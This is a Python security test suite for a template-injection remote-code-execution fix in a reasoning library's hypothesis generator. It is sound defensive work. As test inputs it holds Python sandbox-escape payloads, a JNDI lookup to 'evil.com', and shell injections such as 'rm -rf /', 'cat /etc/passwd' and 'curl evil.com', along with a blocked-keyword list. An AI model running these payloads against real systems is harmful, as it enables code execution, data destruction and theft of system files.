#!/usr/bin/env python3
"""
Comprehensive test suite for CRIT-001 Template Injection RCE Fix.

This test specifically validates that the security fix for template injection
is comprehensive and handles all edge cases properly.
"""

import sys
import os
import re

# Add the src directory to the path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

from reasoning_library.abductive import (
    _sanitize_input_for_concatenation,
    _safe_hypothesis_template,
    _sanitize_template_input,
    _generate_domain_template_hypotheses,
    generate_hypotheses
)


def test_sanitization_comprehensive():
    """Test that _sanitize_input_for_concatenation blocks ALL dangerous patterns."""
    print("Testing comprehensive input sanitization...")

    # Test cases that should be completely sanitized
    dangerous_inputs = [
        # Template injection patterns
        "{__import__('os').system('pwned')}",
        "${jndi:ldap://evil.com/a}",
        "%s%pwned",
        "{malicious.format.string}",

        # Attribute access patterns
        ".__import__",
        ".__globals__",
        ".__builtins__",
        ".system",
        ".eval",
        ".exec",

        # Shell metacharacters
        "; rm -rf /",
        "| cat /etc/passwd",
        "& curl evil.com",
        "$PATH",
        "`whoami`",

        # Programming keywords
        "import os",
        "eval('malicious')",
        "exec('code')",
        "subprocess.call",
        "os.system",

        # Complex combinations
        "{__import__('os').system('rm -rf /')}.config.globals",
        "${jndi:ldap://evil.com/a} | whoami",
        "%s.class.__bases__[0].__subclasses__()",
    ]

    for dangerous_input in dangerous_inputs:
        sanitized = _sanitize_input_for_concatenation(dangerous_input)

        # Check that all dangerous patterns are removed
        assert '{' not in sanitized, f"Brace not removed in: {dangerous_input} -> {sanitized}"
        assert '}' not in sanitized, f"Brace not removed in: {dangerous_input} -> {sanitized}"
        assert '$' not in sanitized, f"Dollar sign not removed in: {dangerous_input} -> {sanitized}"
        assert '%' not in sanitized, f"Percent sign not removed in: {dangerous_input} -> {sanitized}"
        assert '__' not in sanitized, f"Dunder pattern not removed in: {dangerous_input} -> {sanitized}"

        # Check specific keywords are blocked
        assert 'import' not in sanitized.lower(), f"Import not blocked in: {dangerous_input} -> {sanitized}"
        assert 'system' not in sanitized.lower(), f"System not blocked in: {dangerous_input} -> {sanitized}"
        assert 'exec' not in sanitized.lower(), f"Exec not blocked in: {dangerous_input} -> {sanitized}"
        assert 'eval' not in sanitized.lower(), f"Eval not blocked in: {dangerous_input} -> {sanitized}"

        # Length should be limited to 50 characters
        assert len(sanitized) <= 50, f"Length limit exceeded: {len(sanitized)} > 50 for input: {dangerous_input}"

    print("✓ All dangerous patterns properly sanitized")


def test_safe_hypothesis_template_security():
    """Test that _safe_hypothesis_template prevents template injection."""
    print("Testing safe hypothesis template generation...")

    template_pattern = "{action} introduced {issue} in {component}"

    # Malicious inputs that should be sanitized
    test_cases = [
        {
            "action": "{__import__('os').system('pwned')}",
            "component": "database{.system('rm -rf /')}",
            "issue": "malicious ${jndi:ldap://evil.com/a}",
        },
        {
            "action": "deploy",
            "component": "server.__import__('os')",
            "issue": "crash with %s%pwned",
        }
    ]

    for i, test_case in enumerate(test_cases):
        result = _safe_hypothesis_template(
            test_case["action"],
            test_case["component"],
            test_case["issue"],
            template_pattern
        )

        # Verify no dangerous patterns remain
        assert '{' not in result, f"Template {i}: Brace found in result: {result}"
        assert '}' not in result, f"Template {i}: Brace found in result: {result}"
        assert '$' not in result, f"Template {i}: Dollar sign found in result: {result}"
        assert '%' not in result, f"Template {i}: Percent sign found in result: {result}"
        assert '__' not in result, f"Template {i}: Dunder found in result: {result}"

        # Verify result is not empty and is reasonable
        assert len(result.strip()) > 0, f"Template {i}: Empty result"
        assert len(result) <= 200, f"Template {i}: Result too long: {len(result)}"

        print(f"✓ Test case {i+1}: {test_case['action'][:20]}... -> safe result")


def test_deprecated_function_security():
    """Test that deprecated _sanitize_template_input delegates to secure function."""
    print("Testing deprecated function security...")

    dangerous_input = "{__import__('os').system('pwned')}"

    # Should delegate to the secure function
    result_old = _sanitize_template_input(dangerous_input)
    result_new = _sanitize_input_for_concatenation(dangerous_input)

    assert result_old == result_new, "Deprecated function should delegate to secure function"
    assert '{' not in result_old, "Deprecated function should sanitize"

    print("✓ Deprecated function properly delegates to secure implementation")


def test_generate_hypotheses_with_malicious_input():
    """Test that generate_hypotheses is safe against malicious input."""
    print("Testing generate_hypotheses with malicious input...")

    # Malicious observations
    malicious_observations = [
        "System crash with {__import__('os').system('pwned')} error",
        "Database connection failed due to ${jndi:ldap://evil.com/a} injection",
        "Server overload from {malicious.format.string} usage",
        "Deploy with __import__('subprocess').call('rm -rf /') caused crash"
    ]

    # Malicious context
    malicious_context = "Attack via {action}.system('rm -rf /') on {component}"

    try:
        result = generate_hypotheses(malicious_observations, None, context=malicious_context)

        # Verify results are safe
        for hypothesis in result.get("hypotheses", []):
            hypothesis_text = hypothesis.get("hypothesis", "")

            # Check no dangerous patterns in hypothesis text
            assert '{' not in hypothesis_text, f"Brace in hypothesis: {hypothesis_text}"
            assert '}' not in hypothesis_text, f"Brace in hypothesis: {hypothesis_text}"
            assert '$' not in hypothesis_text, f"Dollar in hypothesis: {hypothesis_text}"
            assert '%' not in hypothesis_text, f"Percent in hypothesis: {hypothesis_text}"
            assert '__' not in hypothesis_text, f"Dunder in hypothesis: {hypothesis_text}"

            # Check testable predictions are also safe
            for prediction in hypothesis.get("testable_predictions", []):
                assert '{' not in prediction, f"Brace in prediction: {prediction}"
                assert '}' not in prediction, f"Brace in prediction: {prediction}"
                assert '$' not in prediction, f"Dollar in prediction: {prediction}"

        print(f"✓ Generated {len(result.get('hypotheses', []))} safe hypotheses")

    except Exception as e:
        # Exception is acceptable for malicious input, but should be safe
        assert "template" not in str(e).lower(), f"Unsafe error message: {e}"
        print(f"✓ Malicious input safely rejected with: {type(e).__name__}")


def test_no_template_format_in_executable_code():
    """Test that template.format() is completely removed from executable code."""
    print("Testing that template.format() is completely removed...")

    # Read the abductive.py file
    abductive_path = os.path.join(os.path.dirname(__file__), '..', 'src', 'reasoning_library', 'abductive.py')

    with open(abductive_path, 'r') as f:
        content = f.read()

    # Remove comments and docstrings to check only executable code
    in_docstring = False
    code_lines = []
    for line in content.split('\n'):
        stripped = line.strip()
        # Skip docstring blocks
        if '"""' in line:
            in_docstring = not in_docstring
        if not in_docstring and not stripped.startswith('#') and not stripped.startswith('"""') and not stripped.startswith("'''"):
            code_lines.append(line)
    code_content = '\n'.join(code_lines)

    # More specific check: exclude commented-out lines and docstrings
    actual_code = re.sub(r'#.*', '', code_content)  # Remove inline comments
    actual_code = re.sub(r'""".*?"""', '', actual_code, flags=re.DOTALL)  # Remove docstrings
    actual_code = re.sub(r"'''.*?'''", '', actual_code, flags=re.DOTALL)  # Remove docstrings

    # CRITICAL: template.format() must not appear in executable code
    assert 'template.format(' not in actual_code, "CRITICAL: template.format() still present in executable code!"

    # Check that safe functions are implemented
    assert '_sanitize_input_for_concatenation' in content, "Secure sanitization function missing"
    assert '_safe_hypothesis_template' in content, "Safe template function missing"

    print("✓ template.format() completely removed from executable code")


def test_edge_cases_and_boundary_conditions():
    """Test edge cases and boundary conditions for security functions."""
    print("Testing edge cases and boundary conditions...")

    # Test None and non-string inputs
    assert _sanitize_input_for_concatenation(None) == "", "None should return empty string"
    assert _sanitize_input_for_concatenation(123) == "", "Non-string should return empty string"
    assert _sanitize_input_for_concatenation([]) == "", "List should return empty string"

    # Test empty string
    assert _sanitize_input_for_concatenation("") == "", "Empty string should remain empty"

    # Test very long strings (should be truncated)
    long_string = "a" * 1000
    result = _sanitize_input_for_concatenation(long_string)
    assert len(result) <= 50, "Long string should be truncated to 50 chars"

    # Test string with only dangerous characters - should reduce to safe alphanumeric only
    dangerous_only = "{[__import__('os').system('pwned')]}"
    result = _sanitize_input_for_concatenation(dangerous_only)
    # Should not contain any dangerous patterns
    dangerous_patterns = ['{', '}', '$', '%', '__', 'import', 'system', 'exec', 'eval', '.', '|', '&', ';', '$', '<', '>', '`']
    for pattern in dangerous_patterns:
        assert pattern not in result, f"Dangerous pattern '{pattern}' remains in: {result}"
    # Should only contain alphanumeric characters (if anything remains)
    if result:
        assert result.isalnum(), f"Result should be alphanumeric only: {result}"

    # Test safe template function with edge cases
    result = _safe_hypothesis_template("", "", "", "{action} {component} {issue}")
    assert result.strip() != "", "Empty inputs should not produce empty result"
    assert "system" in result.lower() or "unknown" in result.lower(), "Should have fallback content"

    print("✓ All edge cases handled properly")


def main():
    """Run all security tests for CRIT-001 fix."""
    print("=" * 70)
    print("CRIT-001 Template Injection RCE Fix - Security Verification")
    print("=" * 70)

    try:
        test_sanitization_comprehensive()
        test_safe_hypothesis_template_security()
        test_deprecated_function_security()
        test_generate_hypotheses_with_malicious_input()
        test_no_template_format_in_executable_code()
        test_edge_cases_and_boundary_conditions()

        print("\n" + "=" * 70)
        print("✅ ALL SECURITY TESTS PASSED")
        print("✅ Template Injection RCE vulnerability has been COMPLETELY FIXED")
        print("✅ No template.format() calls remain in executable code")
        print("✅ Comprehensive input sanitization is implemented")
        print("✅ Edge cases are properly handled")
        print("=" * 70)

        return True

    except Exception as e:
        print(f"\n❌ SECURITY TEST FAILED: {e}")
        print("❌ Template Injection RCE fix is INCOMPLETE")
        print("=" * 70)
        return False


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)